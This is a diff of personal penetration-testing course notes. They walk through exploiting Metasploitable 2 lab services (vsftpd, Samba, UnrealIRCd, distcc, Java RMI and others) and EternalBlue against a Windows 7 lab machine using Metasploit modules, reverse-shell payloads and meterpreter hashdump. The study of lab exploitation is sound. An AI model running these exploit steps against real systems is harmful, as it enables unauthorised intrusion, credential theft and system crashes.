@@ -148,9 +148,9 @@ and finally to execute the setup we've did so far the foll. cmd is used:
 
 MSFCONSOLE OTHER MISC:
 to search a specific software service:
-> search <software_name> (basically the software_name is found out from the nmap service scan without the version of the software itself)
+> search <software_name>
 
-[VIDEO (vsftpd - FIRST VULNERABILITY EXPLOITATION)]:
+[VIDEO (vsftpd - FIRST VULNERABILITY EXPLOITATION)] METASPLOITABLE 2.0
 	start scanning metasploitable VM using nmap (-sV) and 
 	then use searchsploit to search for the service /w version whether we have an exploit for that and check whether metasploit version of exploit is available
 	if its available goto metasploit and do "search <software_name>" and select the matching version with "use <exploit_loc>" and the above following steps as done
@@ -159,16 +159,16 @@ Eg: Exploiting vsftpd 2.3.4
 > set <params> <param_value>
 > exploit
 
-[VIDEO (BindShell Misconfiguration - basically a metasploitable shell that's opened without any username or password unconfigured)]
+[VIDEO (BindShell Misconfiguration - basically a metasploitable shell that's opened without any username or password unconfigured)] METASPLOITABLE 2.0
 NC(Netcat):
 > nc -h (help menu)[pretty much the whole help page is self explanatory]
 eg: to connect to a service: nc <ip_addr> <port_number>
 
-[VIDEO (Telnet Exploitation - similar to above but with default username & password that's not changed)]
+[VIDEO (Telnet Exploitation - similar to above but with default username & password that's not changed)] METASPLOITABLE 2.0
 to access telnet in cmd:
 > telnet <ip_addr>
 
-[VIDEO (Samba Exploitation - here we tend to find out the exact version of samba before exploiting)]
+[VIDEO (Samba Exploitation - here we tend to find out the exact version of samba before exploiting)] METASPLOITABLE 2.0
 after scanning in nmap (-sV) we tend to find out the partial version of samba service but 
 we to find the exact version we use msfconsole and in it using the auxiliary module we have a submodule called scanner and within it we have specifics to smb(samba).
 so using autocomplete feature we can enter the foll. cmd:
@@ -185,7 +185,7 @@ in result check for the keyword 'username' in description column and note its pa
 > use exploit/multi/samba/usermap_script' (here multi/ says that this exploit works for different OS)
 again we set options(RHOSTS) and run it using 'exploit' cmd to gain root access 
 
-[VIDEO (SSH Exploitation - here we brute force usernames(n), passwords(m)[nxm combinations] to check whether weak passwords are set)]
+[VIDEO (SSH Exploitation - here we brute force usernames(n), passwords(m)[nxm combinations] to check whether weak passwords are set)] METASPLOITABLE 2.0
 here we use one of the auxiliary module to brute login to SSH so we search:
 > search auxiliary scanner ssh
 from the result we search for a script description: 'SSH Login Check Scanner'.This script allows us to bruteforce SSH target so we use it as follows:
@@ -204,7 +204,7 @@ since we got the username, password of the SSH we can use the normal of accessin
 > ssh <username>@<ip_addr> (after initalization, asks for password )
 eg: ssh msfadmin@192.168.1.98
 
-[VIDEO (Unreal IRCd backdoor Command Execution(CE))]
+[VIDEO (Unreal IRCd backdoor Command Execution(CE))] METASPLOITABLE 2.0
 here after nmap -sV we get the info UnrealIRCd running in 6667
 search for the following:
 > searchsploit unrealircd (a BCE exploit in metasploit is found)
@@ -217,12 +217,12 @@ set all options and default payload wont be setup so use the following:
 since we've selected reverse shell we set the ip for LHOST
 then 'exploit'
 
-[VIDEO (distccd Arbitrary Command Execution(ACE))]
+[VIDEO (distccd Arbitrary Command Execution(ACE))] METASPLOITABLE 2.0
 search 'ccd' in msfc and select the following:
 > use exploit/unix/misc/distcc_exec
 set options (RHOSTS, LHOST[if revshell is set as payload]) and 'exploit'
 
-[VIDEO (Ruby DRb RMI Command Execution)]
+[VIDEO (Ruby DRb RMI Command Execution)] METASPLOITABLE 2.0
 in this case we search for ruby drb but we get no luck in msfc so using searchsploit we find out the exploit named as 'Distributed Ruby - Send instance_eval/syscall Code Execution (Metasploit)'
 but in msf6 it is not present, so we need to proceed with the searchsploit by find out the path of that script which is done the following cmd:
 > searchsploit -p <path_column_number> (in our case path_column_number = 17058)
@@ -230,11 +230,11 @@ try copying the file to the msf's linux/misc module and execute it in msfc as fo
 > use exploit/linux/misc/<name_of_script>.rb
 set options and 'exploit'
 
-[VIDEO (VNC Protocol 3.3 (Default Password))]
+[VIDEO (VNC Protocol 3.3 (Default Password))] METASPLOITABLE 2.0
 using vncviewer application in Kali linux we can connect it with the default password as follows:
 > vncviewer <target_ip> (default password: password)
 
-[VIDEO (Java RMI Code Execution)]
+[VIDEO (Java RMI Code Execution)] METASPLOITABLE 2.0
 searching we search msfc for 'rmi' and results related to it and further filtering from them we get the following and use it:
 > use exploit/multi/misc/java_rmi_server
 set options as said previously but in this case the default payload selected is meterpreter which seems to run using java
@@ -242,3 +242,27 @@ here only the session is created, so to access the shell we use the 'sessions' c
 > session -i <Id_number>
 so after entering into the target's shell we can enter the following: (use help command in meterpreter for all available cmds)
 meterpreter > shell (normally the shell consists of its own aliases of cmds so to use the bash one this helps)
+
+[VIDEO (MicrosoftDS(SMBv1) Eternal Blue Exploit)] WINDOWS 7 Ultimate SP1 x64
+NOTE: this exploit works only if windows firewall is turned off as in real world windows PCs when pinged, they normally filter it but one that's used to provide services to a company or elsewhere those ports would be opened, so we're not faking anything in here
+first we need to check whether our target's win7 machine is vulnerable to this exploit. so we use the auxiliary module present in msfc,
+so we search for it as follows:
+> search eternalblue
+from the search result we get an auxiliary called: smb_ms17_010, so we use it as follows:
+> use auxiliary/scanner/smb/smb_ms17_010
+set options (RHOSTS) and 'run'. After run it shows whether its vulnerable/not
+now we run the exploit that resulted in the search as follows, i.e: ms17_010_eternalblue:
+> use exploit/windows/smb/ms17_010_eternalblue
+set the options (RHOSTS) 
+after above cmd a default payload will be setup but make sure it matches the target's pc architecture as by default 64bit meterpreter revshell for windows would be selected
+so to change it use the foll:
+> set payload windows/meterpreter/reverse_tcp
+now run 'exploit' to start the exploitation
+after gaining the shell access in meterpreter use the following cmd to view the account type:
+> getuid (getuserid[OUTPUT: NT AUTHORITY/SYSTEM] this account type is the highest account privilege rights) 
+since we are in meterpreter we can enter 'shell' to get the dedicated windows cmd in attacker's pc or using the cmd 'help' we can get other options like:
+> meterpreter > screenshot
+> meterpreter > hashdump
+DISCLAIMER: THE FOLLOWING EXTRA DIDN'T WORKOUT WHILE PERFORMING. TBE
+EXTRA: the same exploit when run in a 32 bit version of win7 it won't work even after the auxiliary scanner says that's its vulnerable to it
+but after switching off the firewall and if we try it, we get the BSOD(Blue scree of death) which actually crashes the system itself due to integer overflow(this overflow is caused by the exploit itself which couldn't be handled by a 32bit win7 PC)
